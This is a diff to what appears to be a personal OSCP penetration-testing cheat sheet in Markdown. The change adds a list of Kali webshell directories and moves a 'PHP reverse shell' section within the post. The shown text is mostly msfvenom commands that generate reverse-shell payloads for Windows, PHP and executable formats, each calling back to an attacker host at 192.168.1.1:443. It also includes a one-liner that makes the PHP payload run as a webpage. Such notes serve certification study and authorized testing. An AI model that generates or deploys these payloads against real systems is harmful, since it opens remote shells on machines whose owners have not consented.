@@ -6,6 +6,13 @@ tags: [OSCP, Cheatsheet]
 layout: post
 ---
 
+###### Webshells
+```
+Kali ready-to-go webshells
+/usr/share/webshells/
+/usr/share/seclists/Web-Shells/
+```
+
 ###### List payload options
 ```
 > msfvenom -l payloads | grep php
@@ -20,6 +27,14 @@ Unstaged payload
 
 Staged payload
 > msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=443 -b "\x00" -f python -v shellcode -a x86 --platform windows > payload.txt
+```
+
+###### PHP reverse shell
+```
+> msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php
+
+Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage.
+> cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste > shell.php
 ```
 
 ###### .elf reverse shell
@@ -38,14 +53,6 @@ x64
 ###### .exe reverse shell
 ```
 > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe > shell.exe
-```
-
-###### .php reverse shell
-```
-> msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php
-
-Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage.
-> cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste > shell.php
 ```
 
 ###### Some more reverse shells
